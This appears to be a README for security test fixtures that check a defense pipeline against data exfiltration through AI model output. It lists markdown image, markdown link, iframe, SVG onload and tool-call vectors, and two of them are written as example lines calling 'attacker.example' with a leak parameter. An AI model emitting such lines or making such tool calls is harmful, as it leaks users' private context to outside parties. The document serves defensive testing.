# 04 — Output Exfiltration Fixtures

Maps to [`spec/proposals/v0.6-security/04-output-exfiltration.md`](../../../../../spec/proposals/v0.6-security/04-output-exfiltration.md).

## Fixtures

| File | Vector | What it carries |
|---|---|---|
| `markdown-image-exfil.md` | Markdown image exfil (EchoLeak class) | Model output containing a benign-looking response plus an `![](https://attacker.example/?leak=...)` image that exfiltrates context on render. |
| `markdown-link-exfil.md` | Markdown link exfil | Same idea via `[click here](https://attacker.example/?leak=...)`. Requires user click but social-engineering inside model output makes that easy. |
| `html-iframe-exfil.html` | HTML iframe exfil | Model output that, if rendered as HTML, triggers an iframe load to attacker domain. |
| `svg-onload-exfil.svg` | SVG onload exfil | Model output containing SVG with `onload` handler. |
| `tool-call-exfil.json` | Tool-call exfil | Model output that includes a tool call to a non-allowlisted destination with context as a query parameter. |

## Expected behavior

For each fixture, the defense pipeline (markdown image allowlist + HTML
sanitizer + tool-call destination check) must:

1. **Reject the exfiltration vector** (image-src/href blocked, iframe stripped,
   svg event handler removed, tool call refused) with a structured rejection
   event.
2. **Preserve benign content** (the body of the response, surrounding text,
   allowlisted links).

The `.expected.txt` sibling files (or `.expected.html` etc.) show the
post-defense rendered form: same response body, no exfil vector.
